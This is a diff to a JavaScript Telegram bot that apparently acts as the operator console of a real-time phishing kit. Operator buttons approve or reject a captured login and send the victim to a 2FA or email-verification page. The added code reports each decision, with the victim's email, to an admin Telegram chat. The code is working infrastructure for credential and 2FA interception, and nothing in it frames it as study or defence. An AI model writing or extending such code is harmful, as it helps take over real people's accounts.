@@ -107,8 +107,45 @@ bot.on("callback_query", async (query) => {
     if (response.ok) {
       console.log(`   ✅✅✅ BACKEND UPDATED SUCCESSFULLY!`);
       console.log(`   Frontend should receive status: ${action === "page1" ? "accepted1" : action === "page2" ? "accepted2" : "rejected"}`);
-    } else {
-      console.log(`   ❌ Backend returned error!`);
+      
+      // ============================================================================
+      // 📨 SEND CONFIRMATION MESSAGE TO TELEGRAM
+      // ============================================================================
+      
+      console.log(`\n   📢 SENDING CONFIRMATION MESSAGE...`);
+      
+      let confirmMessage = "";
+      if (action === "page1") {
+        confirmMessage = `✅ <b>2FA AUTH APPROVED</b> ✅\n\n📧 Email: <code>${email}</code>\n\n🔑 Status: Redirecting to 2FA page...`;
+      } else if (action === "page2") {
+        confirmMessage = `✅ <b>EMAIL APPROVED</b> ✅\n\n📧 Email: <code>${email}</code>\n\n📧 Status: Redirecting to email verification page...`;
+      } else if (action === "reject") {
+        confirmMessage = `❌ <b>LOGIN REJECTED</b> ❌\n\n📧 Email: <code>${email}</code>\n\n⛔ Status: Access denied`;
+      }
+      
+      try {
+        const botToken = process.env.BOT_TOKEN;
+        const chatId = process.env.ADMIN_CHAT_ID;
+        
+        const messageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        const msgResponse = await fetch(messageUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: confirmMessage,
+            parse_mode: "HTML"
+          })
+        });
+        
+        if (msgResponse.ok) {
+          console.log(`      ✅ Confirmation message sent to Telegram!`);
+        } else {
+          console.error(`      ❌ Failed to send confirmation message`);
+        }
+      } catch (err) {
+        console.error(`      ❌ Error sending confirmation message:`, err.message);
+      }
     }
 
     console.log(`\n   🔔 ANSWERING CALLBACK QUERY...`);
